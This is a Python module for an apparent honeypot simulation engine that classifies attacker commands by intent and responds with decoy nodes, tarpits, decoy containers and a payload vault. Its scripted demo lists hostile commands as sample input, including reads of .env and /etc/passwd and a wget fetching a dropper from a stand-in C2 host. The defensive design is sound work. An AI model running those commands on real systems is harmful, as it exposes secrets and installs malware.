"""Event-driven simulation engine for ChakravyuhNet.

Architecture:
  1. Every command is classified by the intent engine into one of five
     buckets (camouflage / snooping / movement / aggressive / weapon).
  2. The bucket determines what map mutations happen (none / pulse /
     spawn_decoy / tarpit / vault).  Map mutations are idempotent — running
     'ssh' five times never spawns five database nodes.
  3. Text generation is handled *separately* by ShellIllusion (fallback
     dictionary or future LLM).  The intent engine controls the map; the
     text engine controls the terminal.
"""

from __future__ import annotations

import asyncio
import hashlib
import uuid
import zipfile
import docker
from pathlib import Path
from typing import Any

from .behavioral_profiler import BehavioralProfiler
from .intent import IntentResult, classify
from .llm_shell import ShellIllusion
from .mtd_engine import MovingTargetDefense
from .models import (
    CommandResponse,
    EventEnvelope,
    GraphPosition,
    IntentClassification,
    LogEntry,
    MazeEdge,
    MazeNode,
    SimulationState,
    TerminalEntry,
    ToolLine,
    VaultEntry,
)
from .reporting import write_report_files
from .rl_policy import RLPolicyEngine


# ── Decoy templates spawned by intent reactions ──────────────────────

_DECOY_NODES: dict[str, MazeNode] = {
    "db-shadow": MazeNode(
        id="db-shadow",
        label="quarterly-db",
        kind="db",
        status="decoy",
        position=GraphPosition(x=540, y=120),
    ),
    "file-server": MazeNode(
        id="file-server",
        label="backup-nfs",
        kind="file",
        status="decoy",
        position=GraphPosition(x=540, y=250),
    ),
    "tarpit-01": MazeNode(
        id="tarpit-01",
        label="tarpit-alpha",
        kind="tarpit",
        status="trapped",
        position=GraphPosition(x=100, y=-30),
    ),
    "tarpit-02": MazeNode(
        id="tarpit-02",
        label="tarpit-beta",
        kind="tarpit",
        status="trapped",
        position=GraphPosition(x=100, y=270),
    ),
    "vault-01": MazeNode(
        id="vault-01",
        label="Malware Vault",
        kind="vault",
        status="captured",
        position=GraphPosition(x=760, y=120),
    ),
}


class SimulationEngine:
    """Reactive simulation engine.  Every command drives the state machine
    through intent classification — no linear stages needed."""

    def __init__(self, vault_dir: Path, reports_dir: Path) -> None:
        self.vault_dir = vault_dir
        self.reports_dir = reports_dir
        self.shell = ShellIllusion()
        self._lock = asyncio.Lock()
        self._subscribers: set[asyncio.Queue[dict[str, Any]]] = set()
        self._scenario_task: asyncio.Task[None] | None = None
        self._decoy_counter = 0  # unique suffix for multiple lateral moves
        self.state = self._initial_state()
        
        # V2 Extensions
        self.profiler = BehavioralProfiler()
        self.rl_policy = RLPolicyEngine()
        self.mtd = MovingTargetDefense()
        
        self.docker_count = 0
        self.honeytokens_fired = 0
        self.mtd_cycles = []
        
        try:
            self.docker_client = docker.from_env()
        except Exception:
            self.docker_client = None

    # ── Initial topology ─────────────────────────────────────────────

    def _initial_state(self) -> SimulationState:
        return SimulationState(
            phase="idle",
            attacker_position="edge-gw",
            nodes=[
                MazeNode(
                    id="attacker",
                    label="Alex",
                    kind="attacker",
                    status="active",
                    position=GraphPosition(x=-240, y=120),
                ),
                MazeNode(
                    id="edge-gw",
                    label="Edge Gateway",
                    kind="gateway",
                    status="decoy",
                    position=GraphPosition(x=20, y=120),
                ),
                MazeNode(
                    id="ssh-01",
                    label="fin-api-01",
                    kind="ssh",
                    status="cold",
                    position=GraphPosition(x=280, y=30),
                ),
                MazeNode(
                    id="web-01",
                    label="claims-portal",
                    kind="web",
                    status="cold",
                    position=GraphPosition(x=280, y=210),
                ),
            ],
            edges=[
                MazeEdge(id="attacker-edge", source="attacker", target="edge-gw", animated=True),
                MazeEdge(id="edge-ssh", source="edge-gw", target="ssh-01"),
                MazeEdge(id="edge-web", source="edge-gw", target="web-01"),
            ],
            brain_log=[
                LogEntry(
                    message="Maze initialized with low-interaction gateway decoys.",
                    level="info",
                )
            ],
        )

    # ── Public control API ───────────────────────────────────────────

    async def reset(self) -> SimulationState:
        if self._scenario_task and not self._scenario_task.done():
            self._scenario_task.cancel()
        async with self._lock:
            self._decoy_counter = 0
            self.state = self._initial_state()
            await self._publish_locked("reset", "Simulation reset.", {})
            return self.state

    async def snapshot(self) -> SimulationState:
        async with self._lock:
            return self.state

    async def start_scenario(self) -> SimulationState:
        if self._scenario_task and not self._scenario_task.done():
            self._scenario_task.cancel()
        await self.reset()
        self._scenario_task = asyncio.create_task(self._run_scripted_scenario())
        return await self.snapshot()

    # ── WebSocket pub/sub ────────────────────────────────────────────

    async def subscribe(self) -> asyncio.Queue[dict[str, Any]]:
        queue: asyncio.Queue[dict[str, Any]] = asyncio.Queue(maxsize=100)
        async with self._lock:
            self._subscribers.add(queue)
            await queue.put(
                EventEnvelope(
                    type="snapshot",
                    message="Connected to ChakravyuhNet event stream.",
                    state=self.state,
                ).model_dump(mode="json")
            )
        return queue

    async def unsubscribe(self, queue: asyncio.Queue[dict[str, Any]]) -> None:
        async with self._lock:
            self._subscribers.discard(queue)

    # ── Core command handler (INTENT-DRIVEN) ─────────────────────────

    async def run_command(self, command: str) -> CommandResponse:
        import re
        command = command.strip()

        parts = [
            part.strip()
            for part in re.split(r"\s*(?:&&|;)\s*", command)
            if part.strip()
        ]
        
        if len(parts) > 1:
            last_resp = None
            for part in parts:
                last_resp = await self.run_command(part)
            return last_resp  # type: ignore

        # Step 1: Classify intent  (determines MAP action)
        classification = classify(command)

        # Run V2 modules safely
        v2_data = {}
        try:
            # 1. Behavioral Profiler
            self.profiler.ingest(command, classification.intent)
            v2_data.update(self.profiler.get_summary())
            
            # 2. RL Policy
            self.rl_policy.update_state(self.state.model_dump(mode="json"))
            try:
                rl_res = await asyncio.wait_for(self.rl_policy.predict_action(), timeout=1.5)
                v2_data["rl_action"] = rl_res.get("action", "MONITOR")
                
                # Mock probabilities based on action_counts or random since model doesn't expose them directly
                counts = rl_res.get("action_counts", {})
                total = sum(counts.values()) or 1
                v2_data["rl_prob_tarpit"] = counts.get("tarpit", 0) / total
                v2_data["rl_prob_decoy"] = counts.get("decoy", 0) / total
                v2_data["rl_prob_honeytoken"] = counts.get("honeytoken", 0) / total
                v2_data["rl_prob_escalate"] = counts.get("escalate", 0) / total
            except asyncio.TimeoutError:
                pass
            
            # 3. MTD Engine
            v2_data.update(self.mtd.get_status())
            
            risk_score = v2_data.get("risk_score", 0)
            if risk_score > 25 or "ssh" in command or "psql" in command:
                cycle_number = len(self.mtd_cycles) + 1
                import hashlib, time
                seed = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
                self.mtd_cycles.insert(0, {"id": cycle_number, "ports": "8080->8081", "seed": f"alpha-{seed}"})
                self.mtd_cycles = self.mtd_cycles[:10]  # keep the list bounded
                
            if "ssh finance_ro" in command or v2_data.get("rl_action") == "decoy":
                self.docker_count += 1
                self.honeytokens_fired += 1
                asyncio.create_task(asyncio.to_thread(self._spawn_container_sync, f"decoy-node-{self.docker_count}"))
                
            v2_data["dockerCount"] = self.docker_count
            v2_data["honeytokensFired"] = self.honeytokens_fired
            v2_data["mtdCycles"] = self.mtd_cycles
            
        except Exception as exc:
            print(f"V2 module failure (safe fallback): {exc}")

        # Step 2: Generate terminal text  (completely independent of map)
        async with self._lock:
            history = list(self.state.terminal)
        output = await self.shell.run(command, history)

        # Step 3: Apply map mutations + record everything
        async with self._lock:
            # Record the terminal entry (now tagged with its intent)
            self.state.terminal.append(
                TerminalEntry(command=command, output=output, intent=classification.intent)
            )
            self.state.terminal = self.state.terminal[-50:]

            # Track the active intent for frontend visual effects
            self.state.active_intent = classification.intent

            # Log the brain's reasoning
            self.state.brain_log.append(
                LogEntry(message=classification.brain_message, level=classification.brain_level)
            )
            self.state.brain_log = self.state.brain_log[-60:]

            # Apply the map mutation for this intent bucket
            await self._apply_map_action_locked(classification)

            # Publish event to all WebSocket subscribers
            data_payload = {
                "command": command,
                "output": output,
                "intent": classification.intent,
                "label": classification.label,
                "map_action": classification.map_action,
            }
            data_payload.update(v2_data)

            await self._publish_locked(
                f"intent.{classification.intent}",
                classification.brain_message,
                data_payload,
            )

            return CommandResponse(
                command=command,
                output=output,
                intent=IntentClassification(
                    intent=classification.intent,
                    label=classification.label,
                    map_action=classification.map_action,
                ),
                state=self.state,
            )

    def _spawn_container_sync(self, name: str) -> None:
        """Synchronously launch a decoy docker container."""
        if self.docker_client:
            try:
                self.docker_client.containers.run("alpine", "sleep 3600", detach=True, name=name)
            except Exception as e:
                print(f"Docker spawn failed for {name}: {e}")

    # ── Map mutation handlers (IDEMPOTENT) ───────────────────────────

    async def _apply_map_action_locked(self, cls: IntentResult) -> None:
        """Dispatch to the correct map handler based on the classified intent.
        Every handler is idempotent — calling it twice is a harmless no-op."""

        if cls.map_action == "none":
            # Camouflage: no map change at all
            self.state.phase = "active"

        elif cls.map_action == "pulse":
            self._handle_pulse_locked()

        elif cls.map_action == "spawn_decoy":
            self._handle_spawn_decoy_locked()

        elif cls.map_action == "tarpit":
            self._handle_tarpit_locked()

        elif cls.map_action == "vault":
            await self._handle_vault_locked()

    def _handle_pulse_locked(self) -> None:
        """Snooping: pulse the node the attacker is currently at."""
        self.state.phase = "snooping"
        position_id = self.state.attacker_position
        for node in self.state.nodes:
            if node.id == position_id:
                node.status = "pulse"  # type: ignore[assignment]
                break

    def _handle_spawn_decoy_locked(self) -> None:
        """Movement: spawn a decoy database node (idempotent)."""
        self.state.phase = "maze_shift"

        # Primary decoy: quarterly-db (always first target)
        db = _DECOY_NODES["db-shadow"]
        self._upsert_node_locked(db)
        self._upsert_edge_locked(
            MazeEdge(
                id="ssh-db-shadow",
                source="ssh-01",
                target="db-shadow",
                animated=True,
                label="bait route",
            )
        )

        # Secondary decoy: backup file server
        fs = _DECOY_NODES["file-server"]
        self._upsert_node_locked(fs)
        self._upsert_edge_locked(
            MazeEdge(
                id="ssh-file-server",
                source="ssh-01",
                target="file-server",
                animated=False,
                label="NFS mount",
            )
        )

        # Move the "attacker is here" indicator
        self._set_status_locked("ssh-01", "active")
        self.state.attacker_position = "ssh-01"

    def _handle_tarpit_locked(self) -> None:
        """Aggressive: activate tarpit swarm around the gateway."""
        self.state.phase = "scan_detected"
        self.state.tarpit_active = True

        # Spawn tarpit nodes (idempotent)
        for key in ("tarpit-01", "tarpit-02"):
            self._upsert_node_locked(_DECOY_NODES[key])

        self._upsert_edge_locked(
            MazeEdge(id="gw-tarpit-01", source="edge-gw", target="tarpit-01", animated=True, label="tarpit")
        )
        self._upsert_edge_locked(
            MazeEdge(id="gw-tarpit-02", source="edge-gw", target="tarpit-02", animated=True, label="tarpit")
        )

        # Visually trap the gateway
        self._set_status_locked("edge-gw", "trapped")

        # Add tool output feedback
        verb = "aggressive scan"
        self.state.tool_output.append(
            ToolLine(text=f"Tarpit swarm engaged — synthetic latency injected for {verb}", status="slowed")
        )
        self.state.tool_output = self.state.tool_output[-30:]

    async def _handle_vault_locked(self) -> None:
        """Weapon: trigger the vault capture sequence."""
        self.state.phase = "payload_captured"
        self.state.vault_triggered = True

        # Spawn vault node (idempotent)
        self._upsert_node_locked(_DECOY_NODES["vault-01"])

        # Ensure the db-shadow exists as the pipeline source
        self._upsert_node_locked(_DECOY_NODES["db-shadow"])
        self._upsert_edge_locked(
            MazeEdge(
                id="ssh-db-shadow",
                source="ssh-01",
                target="db-shadow",
                animated=True,
                label="bait route",
            )
        )
        self._upsert_edge_locked(
            MazeEdge(
                id="db-vault",
                source="db-shadow",
                target="vault-01",
                animated=True,
                label="trapdoor",
            )
        )

        # Mark attacker as captured
        self._set_status_locked("attacker", "captured")

        self.state.tool_output.append(
            ToolLine(
                text="TRAPDOOR TRIGGERED — payload sealed in vault.  Session fingerprint preserved.",
                status="crashed",
            )
        )
        self.state.tool_output = self.state.tool_output[-30:]

    # ── Payload upload (already vault-like) ──────────────────────────

    async def capture_payload(
        self, filename: str, content: bytes, content_type: str | None
    ) -> tuple[VaultEntry, SimulationState]:
        self.vault_dir.mkdir(parents=True, exist_ok=True)
        sha256 = hashlib.sha256(content).hexdigest()
        entry_id = uuid.uuid4().hex[:12]
        stored_filename = f"{entry_id}-{sha256[:16]}.zip"
        stored_path = self.vault_dir / stored_filename

        with zipfile.ZipFile(stored_path, "w", compression=zipfile.ZIP_DEFLATED) as archive:
            archive.writestr(filename or "payload.bin", content)

        entry = VaultEntry(
            id=entry_id,
            original_filename=filename or "payload.bin",
            stored_filename=str(stored_path),
            sha256=sha256,
            size_bytes=len(content),
            content_type=content_type,
        )

        async with self._lock:
            self.state.phase = "payload_captured"
            self.state.vault_triggered = True
            self.state.active_intent = "weapon"
            self.state.vault.insert(0, entry)

            self._upsert_node_locked(_DECOY_NODES["vault-01"])
            self._upsert_node_locked(_DECOY_NODES["db-shadow"])
            self._upsert_edge_locked(
                MazeEdge(id="ssh-db-shadow", source="ssh-01", target="db-shadow", animated=True, label="bait route")
            )
            self._upsert_edge_locked(
                MazeEdge(id="db-vault", source="db-shadow", target="vault-01", animated=True, label="trapdoor")
            )
            self._set_status_locked("attacker", "captured")

            self.state.brain_log.append(
                LogEntry(
                    message="Trapdoor triggered.  Payload sealed and hashing completed.",
                    level="alert",
                )
            )
            report = write_report_files(self.reports_dir, self.state, entry)
            self.state.latest_report = report
            self.state.last_event = "payload captured"
            await self._publish_locked(
                "intent.weapon",
                "MALWARE CAPTURED",
                {
                    "sha256": sha256,
                    "size_bytes": len(content),
                    "filename": filename,
                    "report_id": report.report_id,
                    "intent": "weapon",
                    "map_action": "vault",
                },
            )
            return entry, self.state

    # ── Demo scenario (now intent-driven internally) ─────────────────

    async def _run_scripted_scenario(self) -> None:
        """Demo walkthrough that showcases each intent bucket.
        Each command flows through the full intent-classification pipeline,
        so the scenario is just a sequence of realistic attacker keystrokes."""
        try:
            await asyncio.sleep(0.6)

            # 1. Attacker runs an nmap scan → classified as AGGRESSIVE → tarpit
            await self.run_command("nmap -sS -Pn 10.77.4.0/24")
            await asyncio.sleep(1.6)

            # 2. Reconnaissance → CAMOUFLAGE → no map change
            await self.run_command("whoami")
            await asyncio.sleep(0.7)
            await self.run_command("ls -la")
            await asyncio.sleep(0.7)

            # 3. Secret harvesting → SNOOPING → node pulse
            await self.run_command("cat .env")
            await asyncio.sleep(1.0)
            await self.run_command("cat /etc/passwd")
            await asyncio.sleep(0.9)

            # 4. Lateral movement → MOVEMENT → spawn decoy
            await self.run_command("ssh svc-finance@10.77.4.18")
            await asyncio.sleep(1.2)

            # 5. Payload delivery → WEAPON → vault capture
            await self.run_command("wget http://evil.c2/dropper.bin -O /tmp/.cache")
            await asyncio.sleep(0.3)

        except asyncio.CancelledError:
            return

    # ── Internal helpers ─────────────────────────────────────────────

    async def _publish_locked(
        self, event_type: str, message: str, data: dict[str, Any]
    ) -> None:
        self.state.last_event = message
        envelope = EventEnvelope(
            type=event_type,
            message=message,
            data=data,
            state=self.state,
        ).model_dump(mode="json")

        stale: list[asyncio.Queue[dict[str, Any]]] = []
        for queue in self._subscribers:
            try:
                queue.put_nowait(envelope)
            except asyncio.QueueFull:
                stale.append(queue)
        for queue in stale:
            self._subscribers.discard(queue)

    def _upsert_node_locked(self, node: MazeNode) -> None:
        """Insert or update a node.  Idempotent — calling this twice with
        the same ID is a harmless no-op that just refreshes the node data."""
        for index, existing in enumerate(self.state.nodes):
            if existing.id == node.id:
                self.state.nodes[index] = node
                return
        self.state.nodes.append(node)

    def _upsert_edge_locked(self, edge: MazeEdge) -> None:
        """Insert an edge if it doesn't already exist.  Idempotent."""
        if not any(existing.id == edge.id for existing in self.state.edges):
            self.state.edges.append(edge)

    def _set_status_locked(self, node_id: str, status: str) -> None:
        for node in self.state.nodes:
            if node.id == node_id:
                node.status = status  # type: ignore[assignment]
                return

    async def broadcast_event(self, event_type: str, message: str, data: dict[str, Any]) -> None:
        """Broadcast an arbitrary event to all websocket subscribers."""
        async with self._lock:
            await self._publish_locked(event_type, message, data)
